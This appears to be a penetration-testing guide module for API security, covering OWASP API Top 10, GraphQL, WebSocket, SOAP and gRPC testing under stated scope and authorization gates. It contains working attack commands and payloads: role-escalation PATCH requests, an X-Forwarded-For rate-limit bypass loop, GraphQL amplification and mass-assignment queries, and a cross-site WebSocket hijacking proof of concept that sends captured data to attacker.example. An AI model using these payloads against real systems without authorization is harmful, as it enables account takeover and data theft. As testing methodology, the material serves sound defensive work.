# API Protocols Module

Covers: REST APIs, OWASP API Top 10, OpenAPI/Swagger, API inventory, rate-limit bypass, GraphQL, WebSocket, SOAP/XML, gRPC, API fuzzing, schema validation, and protocol-specific authorization flaws.

## Contents

- Goals and API inventory
- REST and schema validation
- GraphQL and WebSocket
- SOAP/XML and gRPC
- API fuzzing, regression collections, and reporting

## Execution Gate

Inventory and schema reads do not authorize fuzzing, rate tests, subscriptions, mutations, or protocol state changes. Enable each active class in `scope.yaml`, cap requests, and use test identities and records.

## Goals

- Discover documented and undocumented APIs.
- Test authorization, authentication, validation, resource limits, and inventory gaps.
- Exercise protocol-specific attack surfaces beyond normal web forms.

## API Inventory

```bash
openghost script run api-inventory -- --target-url https://<target>

# Common docs and metadata
openghost bash 'for p in /swagger.json /openapi.json /api-docs /docs /redoc /v2/api-docs /swagger/v1/swagger.json /.well-known/openapi.yaml /.well-known/openid-configuration; do echo -n "$p: "; curl -s -o /dev/null -w "%{http_code}\n" https://<target>$p; done'

# Version discovery
openghost bash 'for v in v1 v2 v3 v4 beta old legacy internal; do echo -n "/api/$v: "; curl -s -o /dev/null -w "%{http_code}\n" https://<target>/api/$v; done'

# JavaScript API mining
openghost bash 'curl -s https://<target>/static/app.js | grep -oE "/api/[A-Za-z0-9_./-]+" | sort -u'
```

Build an API matrix:

```markdown
| Method | Path | Auth | Role | Params | Object IDs | Source | Tests |
|---|---|---|---|---|---|---|---|
| GET | /api/users/{id} | bearer | user | id | user id | JS | BOLA, data exposure |
```

## REST API Testing - OWASP API Top 10

For low-impact initial signals:

```bash
OPENGHOST_TARGET_BEARER_TOKEN='<target-app-token>' \
  openghost script run api-owasp-top10 -- --base-url https://<target> --endpoints '/api/users/{id}' --ids 101,102
```

### API1: Broken Object Level Authorization

See `access-control.md`. Test every object ID in path, query, body, and headers.

### API2: Broken Authentication

See `session-auth.md`. Also test:

- API key in URL, logs, JS, mobile apps
- token reuse after logout/password reset
- refresh token rotation
- missing audience/issuer checks
- predictable API keys
- basic auth exposed over HTTP

### API3: Broken Object Property Level Authorization

Test read and write property exposure:

```bash
openghost bash 'curl -s -H "Authorization: Bearer <TOKEN>" https://<target>/api/users/me | jq .'
openghost bash 'curl -s -X PATCH -H "Authorization: Bearer <TOKEN>" -H "Content-Type: application/json" -d "{\"role\":\"admin\",\"plan\":\"enterprise\"}" https://<target>/api/users/me'
```

### API4: Unrestricted Resource Consumption

Only perform safe tests unless DoS/resource testing is authorized.

Test:

- large pagination: `?limit=100000`
- expensive sort/filter
- file upload size limits
- image/PDF conversion limits
- GraphQL depth/alias amplification
- batch endpoint limits
- slow external URL fetchers

### API5: Broken Function Level Authorization

Call privileged functions with lower-role tokens:

```bash
openghost bash 'curl -s -H "Authorization: Bearer <USER_TOKEN>" https://<target>/api/admin/users'
openghost bash 'curl -s -X DELETE -H "Authorization: Bearer <USER_TOKEN>" https://<target>/api/users/<id>'
```

### API6: Server-Side Request Forgery

Test URL parameters and webhook/import endpoints. See `injection.md`.

### API7: Security Misconfiguration

Check:

- verbose errors
- CORS reflection
- missing HTTPS
- unnecessary methods
- default docs/admin enabled
- old API versions
- missing schema validation

### API8: Lack of Protection from Automated Threats

Test rate limits safely:

```bash
openghost bash 'for ip in 1.1.1.{1..10}; do curl -s -H "X-Forwarded-For: $ip" -X POST https://<target>/api/login -d "user=test&pass=bad$ip" -o /dev/null -w "$ip %{http_code}\n"; done'
```

### API9: Improper Inventory Management

Look for:

- `/api/v1` still active after `/api/v2`
- mobile-only hosts
- staging docs on production host
- unauthenticated old endpoints
- shadow GraphQL/SOAP endpoints

### API10: Unsafe Consumption of APIs

Test third-party integrations that fetch URLs, parse JSON/XML, process webhooks, or trust upstream data.

## Schema and Validation Testing

For OpenAPI endpoints, test:

- unknown fields accepted
- type confusion: string vs number vs boolean vs null vs array
- enum bypass through case variation
- overlong strings
- nested object injection
- duplicate JSON keys
- content-type confusion

Examples:

```json
{"price":"0"}
{"price":0}
{"price":null}
{"price":[0]}
{"role":"USER"}
{"role":"user\u0000admin"}
```

## GraphQL

Template helper:

```bash
openghost script run graphql-check -- --graphql-url https://<target>/graphql
```

### Discovery

```bash
openghost bash 'for p in /graphql /graphiql /gql /query /api/graphql /v1/graphql; do echo -n "$p: "; curl -s -o /dev/null -w "%{http_code}\n" -X POST -H "Content-Type: application/json" -d "{\"query\":\"{__typename}\"}" https://<target>$p; done'
```

### Introspection

```bash
openghost bash 'curl -s -X POST -H "Content-Type: application/json" -d "{\"query\":\"{__schema{types{name,fields{name,type{name kind}}}}}\"}" https://<target>/graphql | jq .'
```

If disabled, infer schema from:

- error messages
- JS bundles
- persisted query names
- autocomplete in GraphiQL
- mobile app traffic
- operation names in network logs

### GraphQL Attacks

Depth test:

```graphql
{ user { friends { friends { friends { friends { id name } } } } } }
```

Alias amplification:

```graphql
{ a1:user(id:1){id} a2:user(id:2){id} a3:user(id:3){id} }
```

Batching:

```json
[{"query":"{user(id:1){email}}"},{"query":"{user(id:2){email}}"}]
```

Field authorization:

```graphql
{ user(id: "<other-user>") { id email role permissions mfaSecret apiKeys } }
```

Mutation mass assignment:

```graphql
mutation { updateUser(input:{name:"x",role:"admin",isAdmin:true}) { id role isAdmin } }
```

## WebSocket

### Discovery

```bash
openghost bash 'curl -s -I -H "Connection: Upgrade" -H "Upgrade: websocket" -H "Sec-WebSocket-Version: 13" -H "Sec-WebSocket-Key: dGVzdA==" https://<target>/ws'
```

Common paths:

```text
/ws, /socket, /socket.io/, /realtime, /chat, /notifications, /graphql, /subscriptions
```

### Testing

```bash
openghost run websocat -H='Authorization: Bearer <TOKEN>' wss://<target>/ws
```

Test:

- handshake without auth
- missing `Origin` validation (CSWSH)
- message-level auth missing after authenticated handshake
- subscribe to another user's room/channel
- replay old messages
- IDOR in message fields
- injection in JSON message values
- rate limits and message flooding only if authorized

CSWSH PoC:

```html
<script>
const ws = new WebSocket('wss://target.example/ws')
ws.onopen = () => ws.send('{"action":"getProfile"}')
ws.onmessage = e => fetch('https://attacker.example/log?d=' + encodeURIComponent(e.data))
</script>
```

## SOAP and XML Web Services

### WSDL Discovery

```bash
openghost bash 'for p in /service?wsdl /api?wsdl /soap?wsdl /wsdl; do echo -n "$p "; curl -s -o /dev/null -w "%{http_code}\n" https://<target>$p; done'
```

Review WSDL for operations, types, endpoints, and authentication requirements.

### SOAP Tests

- SOAPAction spoofing
- XML injection
- XXE via envelope
- oversized XML only if authorized
- WS-Security signature validation
- replay of signed messages
- operation-level authorization

SOAPAction spoofing example:

```http
SOAPAction: "deleteUser"
```

Body still contains another operation; check which one the server executes.

## gRPC

### Discovery

Indicators:

- HTTP/2 service
- `content-type: application/grpc`
- reflection service enabled
- protobuf files in repos/JS/mobile apps

### Tests

- reflection endpoint exposed
- plaintext gRPC without TLS
- missing metadata auth
- method-level authorization gaps
- message field tampering
- BOLA in message IDs
- oversized messages only if authorized

If `grpcurl` is available:

```bash
openghost run grpcurl -plaintext <target>:<port> list
openghost run grpcurl -H "authorization: Bearer <TOKEN>" <target>:<port> list
```

## API Fuzzing

Use fuzzing after inventory and scope are clear.

```bash
# Parameter discovery
openghost run arjun -u https://<target>/api/search

# Endpoint fuzzing
openghost run ffuf -u https://<target>/api/FUZZ -w /usr/share/seclists/Discovery/Web-Content/api/api-endpoints.txt -mc 200,401,403
```

For stateful API fuzzing, import the OpenAPI spec into a suitable fuzzer only with rate limits and test accounts.

### Stateful Fuzzing Gate

Sequence-aware fuzzers can create, modify, and delete resources. Use them only when all are true:

- target is a disposable environment or explicit production write testing is approved
- OpenAPI/Swagger spec or equivalent request collection is available
- test accounts, tenants, and seed data are isolated
- rate limits and max duration are recorded in `scope.yaml`
- cleanup owner and cleanup commands are documented
- findings from 5xx errors are manually triaged before reporting

Suggested progression:

1. Run compile/schema validation through `openghost` in the sandbox.
2. Run smoke/test mode against a tiny endpoint subset.
3. Run short fuzz-lean mode with strict time limits.
4. Review created objects and cleanup.
5. Only then expand endpoint coverage.

Track output as artifacts first. Promote to findings only after manual reproduction and impact proof.

## API Regression Collections

When OpenAPI, Postman collections, or captured traffic exist, build a repeatable multi-role regression matrix:

```markdown
| Endpoint | Unauth | User A | User B | Admin | Expected |
|---|---|---|---|---|---|
| GET /api/users/{user_b} | 401 | 403 | 200 | 200 | object owner/admin only |
| PATCH /api/users/me role=admin | 401 | 400/403 | 400/403 | 400/403 | sensitive field rejected |
```

Regression checks should cover:

- auth required on every protected endpoint
- user A cannot read or modify user B resources
- lower roles cannot call admin functions
- sensitive response properties are absent for low roles
- mass-assignment fields are rejected
- refresh/logout/password-reset token lifecycle works
- rate limits apply across IP/header/account variations

Store collections, environment files, and runner output with `openghost artifact add --kind tools` or `--kind inventory`. Store only manually confirmed request/response pairs as evidence.

## Reporting Checklist

- API endpoint and method
- Auth context and role
- Request/response pair
- Schema/docs source if relevant
- Object/function/property affected
- Protocol-specific evidence: GraphQL query, WebSocket transcript, SOAP envelope, gRPC method/message
- Impact and safe reproduction steps
